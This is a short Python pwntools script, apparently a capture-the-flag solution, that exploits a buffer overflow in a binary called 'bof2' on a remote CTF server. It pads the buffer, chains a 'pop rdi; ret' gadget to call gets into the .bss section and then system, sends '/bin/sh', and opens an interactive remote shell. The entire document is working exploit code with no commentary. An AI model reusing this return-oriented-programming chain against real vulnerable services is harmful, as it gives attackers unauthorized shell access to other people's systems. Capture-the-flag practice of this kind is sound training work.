#!/usr/bin/env python2
from pwn import *
import pwnlib.elf

c = remote('ctf.bitx.tw', 10102)
e = ELF('bof2')

ans = '\0' * (0x40 + 8)
ans += p64(0x400703) # pop rdi ; ret
ans += p64(e.bss() + 100)
ans += p64(e.plt['gets'])
ans += p64(0x400703) # pop rdi ; ret
ans += p64(e.bss() + 100)
ans += p64(e.plt['system'])
c.sendline(ans)

ans = '/bin/sh'
c.sendline(ans)

c.interactive()
c.close()
